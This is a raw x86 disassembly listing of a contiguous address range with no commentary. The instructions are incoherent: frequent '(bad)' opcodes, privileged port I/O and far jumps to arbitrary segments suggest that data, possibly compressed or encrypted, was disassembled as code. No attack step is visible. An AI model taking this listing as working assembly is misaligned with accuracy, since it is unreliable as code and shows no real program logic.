  41246f:	add    BYTE PTR [ecx],0xf4
  412472:	call   0x9fdcb5be
  412477:	sbb    al,ah
  412479:	nop
  41247a:	test   eax,0x18cd4a3b
  41247f:	lock pushf 
  412481:	mov    ch,0xa5
  412483:	add    esp,DWORD PTR [eax+0x36a6e27d]
  412489:	cmc    
  41248a:	call   0xc135:0x9ec84624
  412491:	ret    
  412492:	add    bh,BYTE PTR [edx]
  412494:	sahf   
  412495:	pop    edi
  412496:	pop    ecx
  412497:	jl     0x41244b
  412499:	xchg   edi,eax
  41249a:	and    cl,BYTE PTR [eax+ebx*2]
  41249d:	cmp    eax,0x749fb9ac
  4124a2:	push   ebx
  4124a3:	mov    dh,0xfd
  4124a5:	jbe    0x412435
  4124a7:	(bad)  
  4124a8:	pop    ss
  4124a9:	jb     0x412489
  4124ab:	xchg   ebx,eax
  4124ac:	cmp    esi,DWORD PTR [ebx+0x60]
  4124af:	cmp    BYTE PTR [ecx-0x336628d],ah
  4124b5:	or     BYTE PTR [edx+0x72],0xfe
  4124b9:	xchg   BYTE PTR [edi+0x657dea10],ch
  4124bf:	cs cwde 
  4124c1:	or     al,0xf4
  4124c3:	sub    BYTE PTR [eax-0x71280f63],ch
  4124c9:	add    edi,edx
  4124cb:	adc    al,0x91
  4124cd:	sbb    edi,DWORD PTR [edi-0x2db1192c]
  4124d3:	jg     0x41253b
  4124d5:	push   edi
  4124d6:	xchg   ebx,eax
  4124d7:	mov    al,0x35
  4124d9:	mov    al,ds:0x7e96e0f3
  4124de:	add    al,0xb1
  4124e0:	jge    0x412538
  4124e2:	cmp    al,0x4e
  4124e4:	loopne 0x4124a9
  4124e6:	or     eax,0xe9d6f013
  4124eb:	pop    esp
  4124ec:	sub    ch,cl
  4124ee:	xchg   edx,eax
  4124ef:	loope  0x4124fd
  4124f1:	xchg   DWORD PTR ss:[edx+0x459a50fc],eax
  4124f8:	or     eax,0xa8f6b98a
  4124fd:	std    
  4124fe:	xor    al,0xd7
  412500:	(bad)  
  412501:	push   eax
  412502:	xchg   edi,eax
  412503:	pop    edi
  412504:	push   ebx
  412505:	es cmp ch,cl
  412508:	and    al,bl
  41250a:	cmp    eax,0xd459b0e5
  41250f:	(bad)  
  412510:	pop    ebp
  412511:	scas   al,BYTE PTR es:[edi]
  412512:	jne    0x4124da
  412514:	lods   eax,DWORD PTR ds:[esi]
  412515:	sub    bh,cl
  412517:	add    BYTE PTR [edi],dh
  412519:	popf   
  41251a:	sahf   
  41251b:	mov    ebx,cs
  41251d:	xchg   edi,eax
  41251e:	pop    ecx
  41251f:	stos   BYTE PTR es:[edi],al
  412520:	xor    bl,ch
  412522:	addr16 xchg esi,eax
  412524:	(bad)  
  412525:	cmp    eax,0xa9b8dd53
  41252a:	mov    dh,BYTE PTR [edi+0x35ffb8b8]
  412530:	and    ch,ch
  412532:	lock ss push esi
  412535:	in     eax,dx
  412536:	cmp    eax,0xbbf9f246
  41253b:	xchg   BYTE PTR [edx-0x3c56458b],cl
  412541:	sahf   
  412542:	rcr    DWORD PTR [edi+ebp*4-0x44f15f36],0xbc
  41254a:	inc    ebp
  41254b:	mov    dh,0x9f
  41254d:	test   al,0xce
  41254f:	retf   0x62b7
  412552:	mov    eax,DWORD PTR [esi+0x2f639cce]
  412558:	mov    bl,0x45
  41255a:	xchg   ebx,eax
  41255b:	sahf   
  41255c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41255d:	cmp    BYTE PTR [ecx-0x7422a3ab],bh
  412563:	ret    0x4326
  412566:	or     ebp,ebx
  412568:	mov    dh,0x16
  41256a:	frstor [edi-0x62b85c0f]
  412570:	scas   eax,DWORD PTR es:[edi]
  412571:	sub    al,ch
  412573:	cli    
  412574:	add    DWORD PTR [edx-0x5b],ecx
  412577:	test   DWORD PTR [edi+ebx*1+0x13da3ce6],0x9c09a2bb
  412582:	dec    eax
  412583:	sub    esp,DWORD PTR [eax-0x71]
  412586:	into   
  412587:	xchg   ebx,eax
  412588:	lahf   
  412589:	push   edx
  41258a:	lods   eax,DWORD PTR ds:[esi]
  41258b:	cmp    eax,0x87244f27
  412590:	imul   esi,edx,0xa
  412593:	nop
  412594:	xchg   ecx,eax
  412595:	hlt    
  412596:	push   0x99f778ab
  41259b:	add    BYTE PTR [ebx],dh
  41259d:	scas   al,BYTE PTR es:[edi]
  41259e:	or     dh,BYTE PTR [esi-0x2032c23e]
  4125a4:	mov    eax,ds:0xec7555e4
  4125a9:	pop    ds
  4125aa:	xchg   edi,eax
  4125ab:	xor    DWORD PTR [ecx+0x40],ebx
  4125ae:	aaa    
  4125af:	ja     0x41260e
  4125b1:	mov    cl,0xf4
  4125b3:	lods   al,BYTE PTR ds:[esi]
  4125b4:	pop    eax
  4125b5:	dec    ebx
  4125b6:	aaa    
  4125b7:	push   esp
  4125b8:	ds test al,0x4c
  4125bb:	mov    dh,0x2e
  4125bd:	mov    ebp,0xc16d144c
  4125c2:	(bad)  
  4125c3:	loope  0x41256d
  4125c5:	ins    DWORD PTR es:[edi],dx
  4125c6:	and    al,0xac
  4125c8:	push   ds
  4125c9:	(bad)  
  4125ca:	and    eax,DWORD PTR [edi-0x51fcf49b]
  4125d0:	push   esi
  4125d1:	pop    esp
  4125d2:	les    esi,FWORD PTR [eax-0x6a8abf71]
  4125d8:	adc    eax,0x66581d45
  4125dd:	test   eax,0xf79f0b24
  4125e2:	repz adc edx,DWORD PTR [ecx+0x1e6eb209]
  4125e9:	fsub   st(1),st
  4125eb:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4125ed:	xor    ebp,DWORD PTR [ecx]
  4125ef:	fldcw  WORD PTR [edx]
  4125f1:	rol    DWORD PTR [ebp-0x30cd02e0],1
  4125f7:	jbe    0x412622
  4125f9:	cmc    
  4125fa:	jb     0x41263c
  4125fc:	inc    eax
  4125fd:	icebp  
  4125fe:	dec    ebx
  4125ff:	cmp    ebp,DWORD PTR [edi]
  412601:	mov    ch,0xb2
  412603:	stc    
  412604:	jl     0x41260f
  412606:	and    esi,DWORD PTR [esi-0x523c330c]
  41260c:	push   cs
  41260d:	jl     0x412664
  41260f:	sbb    eax,0xa81cfd32
  412614:	add    al,ch
  412616:	icebp  
  412617:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412618:	sub    al,0x1a
  41261a:	test   BYTE PTR [ecx+0x63b12c4c],cl
  412620:	xchg   DWORD PTR [ebp+0x79],esp
  412623:	add    eax,0x7943dcbe
  412628:	loop   0x412699
  41262a:	mov    ah,0x5a
  41262c:	inc    edx
  41262d:	xor    BYTE PTR ds:0x7917225e,0x6d
  412634:	neg    BYTE PTR ss:[ebx]
  412637:	inc    esp
  412638:	jmp    0x4126b6
  41263a:	int    0xc8
  41263c:	retf   
  41263d:	rol    DWORD PTR [edi+0x6f],1
  412640:	adc    DWORD PTR [ecx],0xef1063d3
  412646:	ins    DWORD PTR es:[edi],dx
  412647:	mov    ch,0x9d
  412649:	adc    eax,0x6a1864f4
  41264e:	into   
  41264f:	and    DWORD PTR [edx],edx
  412651:	pop    ebp
  412652:	dec    ecx
  412653:	imul   esi,DWORD PTR [ebx+ecx*1],0xf
  412657:	ja     0x412622
  412659:	cld    
  41265a:	test   BYTE PTR [edx],0x30
  41265d:	int    0x4
  41265f:	and    al,0x41
  412661:	loopne 0x412620
  412663:	repnz (bad) 
  412665:	or     ch,BYTE PTR [esi+0x13]
  412668:	repnz mov bh,0x8c
  41266b:	ins    BYTE PTR es:[edi],dx
  41266c:	jmp    0x412679
  41266e:	inc    DWORD PTR [ecx-0x3e]
  412671:	xor    bl,BYTE PTR [esi-0x33]
  412674:	pushf  
  412675:	imul   edi,DWORD PTR [edx+0x66c4b1d8],0xec0b2586
  41267f:	(bad)  
  412680:	jmp    0x3fe82814
  412685:	add    ah,al
  412687:	mov    dl,0x74
  412689:	ds arpl bx,ax
  41268c:	stos   BYTE PTR es:[edi],al
  41268d:	sub    bh,0xbf
  412690:	scas   al,BYTE PTR es:[edi]
  412691:	cs xchg edx,eax
  412693:	int3   
  412694:	xor    eax,DWORD PTR [ecx]
  412696:	aad    0x28
  412698:	dec    ecx
  412699:	pcmpgtw mm4,QWORD PTR ds:0xf2f7a665
  4126a0:	rol    ch,0xc4
  4126a3:	or     ebx,DWORD PTR [ebp+esi*2-0x7b]
  4126a7:	fist   WORD PTR [edx-0x255daecb]
  4126ad:	jge    0x4126c8
  4126af:	adc    ch,0xc5
  4126b2:	adc    DWORD PTR [ecx-0x4f9f77fe],0x54
  4126b9:	aaa    
  4126ba:	fistp  QWORD PTR [esi+0x11ee603f]
  4126c0:	dec    ebp
  4126c1:	les    ecx,FWORD PTR [ecx]
  4126c3:	or     BYTE PTR [ecx-0x216aa475],0xf7
  4126ca:	push   edx
  4126cb:	mov    esp,0xca75b348
  4126d0:	inc    ebp
  4126d1:	sbb    DWORD PTR [ebp+edx*8+0x2a],edi
  4126d5:	lods   eax,DWORD PTR ds:[esi]
  4126d6:	(bad)  
  4126d7:	(bad)  
  4126d8:	pop    edi
  4126d9:	pop    edx
  4126da:	jp     0x412698
  4126dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126dd:	ret    0xa8cb
  4126e0:	adc    al,BYTE PTR [esi-0x142e2dbb]
  4126e6:	inc    dx
  4126e8:	fsubp  st(0),st
  4126ea:	push   cs
  4126eb:	(bad)  
  4126ec:	jl     0x4126f9
  4126ee:	test   al,0xef
  4126f0:	and    dl,BYTE PTR [edx+0x35e8c4e5]
  4126f6:	sahf   
  4126f7:	push   edx
  4126f8:	mov    edi,0x1acd572f
  4126fd:	sbb    DWORD PTR [ecx-0x466906a1],edx
  412703:	add    edi,DWORD PTR [ebp+edx*8+0xb]
  412707:	mov    edi,DWORD PTR [ebx+0x1d]
  41270a:	jno    0x4126f7
  41270c:	cld    
  41270d:	mov    ebx,0x11fd92a1
  412712:	sbb    BYTE PTR [eax],cl
  412714:	aad    0x38
  412716:	retf   
  412717:	lock or al,0xad
  41271a:	fist   DWORD PTR [ecx-0x31]
  41271d:	les    edi,FWORD PTR [ecx+0x4]
  412720:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412721:	sub    edx,DWORD PTR [eax]
  412723:	cwde   
  412724:	popa   
  412725:	mov    edx,0x1a00dd07
  41272a:	pop    esi
  41272b:	inc    esi
  41272c:	lods   eax,DWORD PTR ds:[esi]
  41272d:	enter  0xdde4,0x55
  412731:	mov    fs,WORD PTR [ebx+0x54366285]
  412737:	and    eax,0xe8c6d40d
  41273c:	add    cl,0x9a
  41273f:	retf   
  412740:	mov    al,BYTE PTR [ecx]
  412742:	mov    al,ds:0x8937d733
  412747:	aad    0xc5
  412749:	lds    eax,FWORD PTR [edi-0x4c]
  41274c:	ret    0x9558
  41274f:	lods   al,BYTE PTR ds:[esi]
  412750:	mov    al,0xaa
  412752:	fidiv  WORD PTR ds:0x90e914c1
  412758:	adc    al,0x6c
  41275a:	push   0x4e28748a
  41275f:	mov    ebx,0x9a49bd76
  412764:	xchg   edi,eax
  412765:	setge  ah
  412768:	mov    ds:0x86c60f73,al
  41276d:	xchg   ebx,eax
  41276e:	mov    dl,0xab
  412770:	sbb    DWORD PTR [ecx-0x56c59a0d],0x5592c760
  41277a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41277b:	cmp    eax,0xe6ce1cee
  412780:	sbb    ebx,DWORD PTR [ebx-0x438ddaf]
  412786:	jmp    0xbbeeefa
  41278b:	ja     0x4127e9
  41278d:	ss and eax,0x7e3fdb76
  412793:	push   ebx
  412794:	(bad)  
  412795:	xor    ch,BYTE PTR [edx-0x62895cd5]
  41279b:	pop    ebp
  41279c:	jo     0x4127ce
  41279e:	push   ecx
  41279f:	jnp    0x412781
  4127a1:	adc    edi,DWORD PTR [ecx+ecx*1+0x58c175a1]
  4127a8:	mov    eax,0xd53c209f
  4127ad:	aas    
  4127ae:	push   ss
  4127af:	sub    esi,ebp
  4127b1:	int3   
  4127b2:	push   esp
  4127b3:	pusha  
  4127b4:	jp     0x41280b
  4127b6:	repnz pop ss
  4127b8:	mov    ebx,DWORD PTR [ecx+0x2a]
  4127bb:	fwait
  4127bc:	imul   ebx,DWORD PTR [ecx+0x605ff4e8],0x3f0b52d4
  4127c6:	or     cl,cl
  4127c8:	fchs   
  4127ca:	ins    BYTE PTR es:[edi],dx
  4127cb:	sub    al,0xee
  4127cd:	call   0x4417:0x8246195c
  4127d4:	or     eax,0x45b40433
  4127d9:	push   ebp
  4127da:	push   eax
  4127db:	push   0x66
  4127dd:	das    
  4127de:	vmovupd YMMWORD PTR ds:0xb60a58b4,ymm7
  4127e6:	pop    eax
  4127e7:	sbb    DWORD PTR [ecx+0x38],edx
  4127ea:	ret    0xda7b
  4127ed:	stos   DWORD PTR es:[edi],eax
  4127ee:	jle    0x41281d
  4127f0:	mov    DWORD PTR [edi+eiz*2+0x35],0xe50c5bac
  4127f8:	(bad)  
  4127f9:	daa    
  4127fa:	(bad)  
  4127fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127fc:	push   cs
  4127fd:	mov    gs,ebx
  4127ff:	fstp   QWORD PTR [edx+0xcb2cff4]
  412805:	test   al,0x98
  412807:	(bad)  
  412808:	pushf  
  412809:	sbb    BYTE PTR [ebp-0x24],cl
  41280c:	je     0x4127be
  41280e:	outs   dx,BYTE PTR ds:[esi]
  41280f:	into   
  412810:	or     dh,BYTE PTR [ebp+0xa]
  412813:	push   0x6a
  412815:	cmp    cl,BYTE PTR [ebp-0x38b0fe59]
  41281b:	cmp    bl,BYTE PTR [edx+edi*8-0x7d1e4d30]
  412822:	pop    edx
  412823:	or     al,BYTE PTR [ecx-0x5a]
  412826:	popf   
  412827:	xor    cl,al
  412829:	sbb    bh,0x99
  41282c:	test   DWORD PTR [eax+ecx*2+0x210c851e],0x1c9f327e
  412837:	inc    edx
  412838:	mov    ds:0x93517a77,eax
  41283d:	mov    esp,0x441b6038
  412842:	jmp    0x412871
  412844:	imul   eax,DWORD PTR [eax+0x38],0x36
  412848:	cli    
  412849:	pushf  
  41284a:	push   cs
  41284b:	adc    esi,ebx
  41284d:	imul   ebp,DWORD PTR [esi-0x9],0xffffffe4
  412851:	or     al,0x37
  412853:	cld    
  412854:	or     DWORD PTR [edi],0xffffffb7
  412857:	or     al,0xbf
  412859:	mov    esp,DWORD PTR [eax+0x33ce851f]
  41285f:	or     ecx,esi
  412861:	xor    al,BYTE PTR [edi]
  412863:	pop    ss
  412864:	mov    esi,0xef25bbb9
  412869:	bound  esp,QWORD PTR [eax-0x35]
  41286c:	and    ebp,DWORD PTR gs:[ebp+0x228dcbb2]
  412873:	neg    DWORD PTR [ebx]
  412875:	data16 aaa 
  412877:	jmp    0x41280d
  412879:	ffree  st(7)
  41287b:	imul   eax,DWORD PTR [ebp-0x19ad5c9],0xffffffcc
  412882:	stos   BYTE PTR es:[edi],al
  412883:	mov    BYTE PTR [eax-0x7aa9c9f2],bl
  412889:	pop    esp
  41288a:	xlat   BYTE PTR ds:[ebx]
  41288b:	out    dx,al
  41288c:	mov    DWORD PTR [ebx+0x7d],esp
  41288f:	jno    0x412864
  412891:	bound  ecx,QWORD PTR gs:0xdf887e21
  412898:	ret    0xe0ba
  41289b:	jne    0x412873
  41289d:	test   eax,0x72d400eb
  4128a2:	sub    BYTE PTR [edx+0x7393e39c],ch
  4128a8:	cmc    
  4128a9:	sar    dh,cl
  4128ab:	or     eax,0x96ff033d
  4128b0:	ds and ebx,edi
  4128b3:	push   cs
  4128b4:	inc    esp
  4128b5:	loopne 0x412909
  4128b7:	sub    BYTE PTR [eax],ah
  4128b9:	mov    edi,0x2ecc1a9d
  4128be:	les    eax,FWORD PTR [ebp+0x6e]
  4128c1:	xor    eax,0x8bd13f66
  4128c6:	dec    ebp
  4128c7:	pop    eax
  4128c8:	jmp    0x874f:0x68f30af4
  4128cf:	push   ss
  4128d0:	out    0x8b,al
  4128d2:	or     DWORD PTR [esi-0x215f3886],ecx
  4128d8:	in     eax,dx
  4128d9:	adc    DWORD PTR [esi],edx
  4128db:	pop    esi
  4128dc:	dec    esp
  4128dd:	(bad)  
  4128de:	push   0xbc3a9616
  4128e3:	adc    cl,BYTE PTR [ebx-0x1f14185]
  4128e9:	sub    esp,DWORD PTR [ebx+0xada249e]
  4128ef:	pop    edi
  4128f0:	xor    al,0x99
  4128f2:	xchg   ecx,eax
  4128f3:	pop    ss
  4128f4:	push   ecx
  4128f5:	jl     0x412930
  4128f7:	and    al,0x3f
  4128f9:	mov    edx,0x75be0694
  4128fe:	es or  eax,0x52a22fac
  412904:	inc    ecx
  412905:	js     0x41293e
  412907:	loop   0x412985
  412909:	sbb    edi,0x4c
  41290c:	fst    DWORD PTR [edx-0x771344fc]
  412912:	enter  0x9d16,0x14
  412916:	repz pop esp
  412918:	inc    ebp
  412919:	(bad)  
  41291b:	pop    esi
  41291c:	ins    BYTE PTR es:[edi],dx
  41291d:	fnstenv [ebp-0x71]
  412920:	add    DWORD PTR [ecx],ebp
  412922:	jo     0x41298a
  412924:	int    0xa
  412926:	ins    BYTE PTR es:[edi],dx
  412927:	leave  
  412928:	pop    es
  412929:	sbb    ch,dl
  41292b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41292c:	clc    
  41292d:	push   0x32362f9b
  412932:	jmp    0x6858:0xff1afeae
  412939:	sub    ebp,ecx
  41293b:	xchg   BYTE PTR [edx+ebx*8-0xf],bh
  41293f:	aam    0xe0
  412941:	in     eax,0x80
  412943:	call   0xadd3:0x798a9f8d
  41294a:	push   es
  41294b:	cwde   
  41294c:	xchg   ebp,eax
  41294d:	sub    eax,DWORD PTR [edx+0x7045fbb0]
  412953:	ins    DWORD PTR es:[edi],dx
  412954:	jl     0x412999
  412956:	pushf  
  412957:	or     ecx,ebx
  412959:	or     DWORD PTR [edi+0x347222],eax
  41295f:	mov    ?,WORD PTR [eax-0x22]
  412962:	cs mov bl,0x11
  412965:	mov    cl,0xcb
  412967:	cdq    
  412968:	push   0xffffff9f
  41296a:	shr    edi,cl
  41296c:	dec    ebx
  41296d:	push   0xb272a6d8
  412972:	lahf   
  412973:	sbb    BYTE PTR [edx-0x78],bl
  412976:	(bad)  
  412978:	inc    ebp
  412979:	test   eax,0xc20fa4cc
  41297e:	pop    ds
  41297f:	push   ebx
  412980:	(bad)
  412984:	fisttp DWORD PTR ds:0xaff22deb
  41298a:	jb     0x4129d0
  41298c:	or     eax,0x11e5eaf8
  412991:	out    dx,eax
  412992:	and    DWORD PTR [esi+0x7564e79],ecx
  412998:	jecxz  0x412a16
  41299a:	xchg   edx,eax
  41299b:	xor    BYTE PTR [ebp+0x16],cl
  41299e:	stc    
  41299f:	xchg   ecx,eax
  4129a0:	or     DWORD PTR ds:0x9bfe5259,0xf4ce6d60
  4129aa:	mov    ecx,0xb0daca7
  4129af:	out    0xc3,al
  4129b1:	cld    
  4129b2:	int    0x1
  4129b4:	xchg   edx,eax
  4129b5:	add    al,0xff
  4129b7:	test   eax,0xf4c6cb1c
  4129bc:	cmp    cl,BYTE PTR [esi+0x66f0189]
  4129c2:	je     0x41297a
  4129c4:	xor    ecx,DWORD PTR [eax]
  4129c6:	cld    
  4129c7:	int    0x2a
  4129c9:	pop    es
  4129ca:	or     esp,ebx
  4129cc:	push   ss
  4129cd:	and    dh,BYTE PTR [ecx]
  4129cf:	xor    cl,al
  4129d1:	hlt    
  4129d2:	fisubr DWORD PTR [ebx+0x6aad7171]
  4129d8:	jae    0x4129cb
  4129da:	fld    DWORD PTR [edx+0x60]
  4129dd:	fucomip st,st(3)
  4129df:	fwait
  4129e0:	call   0xcd3c96a6
  4129e5:	mov    dl,0xb5
  4129e7:	jno    0x4129bd
  4129e9:	xor    eax,0xcb10a7ba
  4129ee:	push   0xe1a91ac6
  4129f3:	int3   
  4129f4:	nop
  4129f5:	lods   eax,DWORD PTR ds:[esi]
  4129f6:	in     eax,dx
  4129f7:	xchg   esp,eax
  4129f8:	dec    esi
  4129f9:	mov    ah,0xa3
  4129fb:	in     al,dx
  4129fc:	cwde   
  4129fd:	or     bl,bl
  4129ff:	mov    ecx,0x546cd47
  412a04:	fiadd  DWORD PTR [edx+esi*1+0x71e2095]
  412a0b:	pop    ebx
  412a0c:	dec    esi
  412a0d:	or     DWORD PTR [eax-0x6e],ecx
  412a10:	call   FWORD PTR [eax+0x2e]
  412a13:	lods   eax,DWORD PTR ds:[esi]
  412a14:	sub    al,dh
  412a16:	push   ds
  412a17:	push   ss
  412a18:	popa   
  412a19:	les    ebx,FWORD PTR [ebx+0x30]
  412a1c:	out    dx,eax
  412a1d:	js     0x412a3e
  412a1f:	pop    esi
  412a20:	and    eax,0xe316b32b
  412a25:	ja     0x412a37
  412a27:	and    ebp,DWORD PTR [esi-0x7f]
  412a2a:	ds pop ss
  412a2c:	call   0xda7c:0xa6ca1b3f
  412a33:	out    dx,eax
  412a34:	repz stc 
  412a36:	addr16 mov esi,0x9f0f2ab5
  412a3c:	sti    
  412a3d:	lods   eax,DWORD PTR ds:[esi]
  412a3e:	das    
  412a3f:	sbb    ch,BYTE PTR [eax+0x5c6bb7c9]
  412a45:	or     edx,edx
  412a47:	adc    cl,BYTE PTR [eax-0x6e]
  412a4a:	icebp  
  412a4b:	rcl    edi,1
  412a4d:	mov    gs,WORD PTR [edx+0x5dc8607b]
  412a53:	or     DWORD PTR [eax],edx
  412a55:	int3   
  412a56:	out    dx,eax
  412a57:	push   ss
  412a58:	xchg   edi,eax
  412a59:	pushf  
  412a5a:	nop
  412a5b:	iret   
  412a5c:	sub    ebp,DWORD PTR [edx+0x4af410eb]
  412a62:	cs popf 
  412a64:	jno    0x412a00
  412a66:	ficomp DWORD PTR [ebx]
  412a68:	ret    0xdbf3
  412a6b:	das    
  412a6c:	add    al,BYTE PTR ds:0xe0a181e8
  412a72:	dec    edi
  412a73:	sahf   
  412a74:	popf   
  412a75:	in     eax,0xf1
  412a77:	shl    BYTE PTR [ecx],0x9
  412a7a:	jb     0x412a95
  412a7c:	dec    bp
  412a7e:	repz fld TBYTE PTR [ebx+0x2b1c3887]
  412a85:	ja     0x412ad1
  412a87:	je     0x412a61
  412a89:	sub    DWORD PTR [ebx],esp
  412a8b:	mov    dh,0x16
  412a8d:	xor    ch,BYTE PTR [ebx-0x63adecfb]
  412a93:	in     eax,dx
  412a94:	inc    edx
  412a95:	sub    al,0x85
  412a97:	pop    ebx
  412a98:	mov    BYTE PTR [esi+0x12654a64],0xea
  412a9f:	cmp    ch,bh
  412aa1:	jmp    0xd1dc:0xdfb4ce70
  412aa8:	dec    esp
  412aa9:	push   ebp
  412aaa:	pop    edi
  412aab:	mov    bh,0xcf
  412aad:	js     0x412a8d
  412aaf:	mov    es,WORD PTR [esi+0x3cdaad0e]
  412ab5:	push   ss
  412ab6:	ret    
  412ab7:	repz je 0x412b22
  412aba:	and    bh,BYTE PTR [ecx+0x57]
  412abd:	ins    DWORD PTR es:[edi],dx
  412abe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412abf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ac0:	rol    DWORD PTR [ecx+0x238bddf3],cl
  412ac6:	test   al,0xb0
  412ac8:	pop    ecx
  412ac9:	outs   dx,DWORD PTR ds:[esi]
  412aca:	ins    BYTE PTR es:[edi],dx
  412acb:	loopne 0x412ae5
  412acd:	adc    DWORD PTR [edx],0xa179d326
  412ad3:	aas    
  412ad4:	test   BYTE PTR [esi+0x6],dl
  412ad7:	repz push 0x845ecc4f
  412add:	pop    edx
  412ade:	jb     0x412b4b
  412ae0:	stc    
  412ae1:	rcr    ecx,1
  412ae3:	lock jl 0x412b04
  412ae6:	xchg   edx,eax
  412ae7:	xor    cl,BYTE PTR [edi-0x38cc204f]
  412aed:	fimul  WORD PTR [eax+0x3b]
  412af0:	pop    ss
  412af1:	xor    eax,0xfeaf82e8
  412af6:	mov    cl,0xb0
  412af8:	mov    bh,0xcd
  412afa:	dec    ebx
  412afb:	aad    0xbb
  412afd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412afe:	fs add al,0xdd
  412b01:	xor    esi,esi
  412b03:	add    bl,BYTE PTR fs:[edi]
  412b06:	sub    DWORD PTR [ecx+edi*4-0x3b],edx
  412b0a:	push   ebx
  412b0b:	mov    ebp,0xddc5f01d
  412b10:	imul   BYTE PTR [ebp+0x59b430b4]
  412b16:	adc    DWORD PTR [ecx-0x25],esi
  412b19:	and    edx,edi
  412b1b:	cmove  edi,esi
  412b1e:	jle    0x412b2c
  412b20:	inc    edi
  412b21:	fwait
  412b22:	inc    ecx
  412b23:	push   ecx
  412b24:	and    eax,0x3f6b893b
  412b29:	jo     0x412af1
  412b2b:	jmp    0x6f7:0x101c0d68
  412b32:	mov    edx,0x7718579
  412b37:	push   cs
  412b38:	cmp    al,0x80
  412b3a:	adc    ebx,DWORD PTR [ebp-0x3c]
  412b3d:	outs   dx,BYTE PTR ds:[esi]
  412b3e:	lea    esp,[edi]
  412b40:	mov    ds:0x15a00d23,eax
  412b45:	mov    dh,0x51
  412b47:	push   eax
  412b48:	or     DWORD PTR [edx*2+0x10a1c090],0xffffffd9
  412b50:	scas   eax,DWORD PTR es:[edi]
  412b51:	call   0x37d7:0xc85cc30d
  412b58:	rol    BYTE PTR [ecx],cl
  412b5a:	pop    eax
  412b5b:	push   esp
  412b5c:	or     ah,bl
  412b5e:	scas   eax,DWORD PTR es:[edi]
  412b5f:	mov    al,ds:0x75c90be6
  412b64:	xchg   bl,ah
  412b66:	lods   al,BYTE PTR ds:[esi]
  412b67:	mov    edi,0x6213f76b
  412b6c:	fist   DWORD PTR [esi+0x735b118f]
  412b72:	test   eax,0xfef8827d
  412b77:	mov    ebx,DWORD PTR [ebx+esi*4-0xf]
  412b7b:	cdq    
  412b7c:	(bad)  
  412b7d:	xor    eax,ebx
  412b7f:	or     eax,0xda3ff738
  412b84:	pop    ebp
  412b85:	or     DWORD PTR [ebp+0x12208c5c],ebx
  412b8b:	je     0x412bdd
  412b8d:	paddw  mm1,QWORD PTR [edi+0x2a]
  412b91:	(bad)  
  412b92:	out    dx,al
  412b93:	enter  0x6244,0x24
  412b97:	sbb    ah,BYTE PTR [edx-0x4]
  412b9a:	sub    al,0xb
  412b9c:	retf   
  412b9d:	dec    esp
  412b9e:	stos   DWORD PTR es:[edi],eax
  412b9f:	jge    0x412b85
  412ba1:	jmp    0xed30:0x5327a7e5
  412ba8:	sbb    al,0xff
  412baa:	pop    ss
  412bab:	jne    0x412b65
  412bad:	lock out 0xb0,eax
  412bb0:	or     al,0xf8
  412bb2:	daa    
  412bb3:	push   esp
  412bb4:	out    dx,al
  412bb5:	scas   eax,DWORD PTR es:[edi]
  412bb6:	jns    0x412bb9
  412bb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bb9:	rcl    BYTE PTR [ebx-0x20ae4120],cl
  412bbf:	ds stos BYTE PTR es:[edi],al
  412bc1:	mov    ch,0x8f
  412bc3:	dec    ecx
  412bc4:	inc    ebx
  412bc5:	dec    edx
  412bc6:	(bad)  
  412bc7:	std    
  412bc8:	in     eax,dx
  412bc9:	pop    esi
  412bca:	rcr    DWORD PTR [edx],0xd8
  412bcd:	mov    esp,0xa63f8fda
  412bd2:	mov    esi,0xd4b1ce05
  412bd7:	inc    esi
  412bd8:	aas    
  412bd9:	mov    ah,0x52
  412bdb:	js     0x412b83
  412bdd:	mov    edx,DWORD PTR [eax+0x46]
  412be0:	enter  0xb99e,0xd4
  412be4:	push   es
  412be5:	cmp    DWORD PTR [eax-0x474d4500],edi
  412beb:	cwde   
  412bec:	inc    eax
  412bed:	cmp    DWORD PTR [eax-0x5],esp
  412bf0:	mov    eax,ds:0xa43dfca9
  412bf5:	mov    ah,0xbc
  412bf7:	xchg   BYTE PTR [esi+edx*1+0x57],dl
  412bfb:	aam    0x6
  412bfd:	(bad)  
  412bfe:	sar    ah,1
  412c00:	dec    eax
  412c01:	mov    cl,0x9c
  412c03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c04:	shl    BYTE PTR [ebp+0x4a],cl
  412c07:	sar    BYTE PTR [ecx+0x63],cl
  412c0a:	cdq    
  412c0b:	push   0x2ef10cd6
  412c10:	inc    esi
  412c11:	jmp    FWORD PTR [ebp-0x10]
  412c14:	test   eax,0x2ced2211
  412c19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c1a:	push   edi
  412c1b:	fs out 0x2a,eax
  412c1e:	inc    ecx
  412c1f:	sbb    al,0x9
  412c21:	sbb    BYTE PTR [esi],cl
  412c23:	adc    al,BYTE PTR [ebp+eiz*4-0x3]
  412c27:	xchg   ecx,eax
  412c28:	cmp    ebx,edx
  412c2a:	jno    0x412bfc
  412c2c:	sub    BYTE PTR [edi],0xc0
  412c2f:	int    0xe5
  412c31:	scas   al,BYTE PTR es:[edi]
  412c32:	scas   eax,DWORD PTR es:[edi]
  412c33:	jo     0x412c58
  412c35:	sub    bl,BYTE PTR [ecx+0x1a]
  412c38:	xor    al,0x4a
  412c3a:	(bad)  
  412c3b:	data16 clc 
  412c3d:	inc    eax
  412c3e:	ja     0x412c7b
  412c40:	xchg   edx,eax
  412c41:	(bad)  
  412c42:	push   ebp
  412c43:	sub    DWORD PTR ds:0xa3168e3b,0x61
  412c4a:	rol    bl,1
  412c4c:	test   al,0x5f
  412c4e:	sbb    DWORD PTR [ebx+0x4311de64],edx
  412c54:	stos   DWORD PTR es:[edi],eax
  412c55:	mul    BYTE PTR [edi]
  412c57:	add    al,0xf8
  412c59:	iret   
  412c5a:	mov    edx,0x48de7708
  412c5f:	icebp  
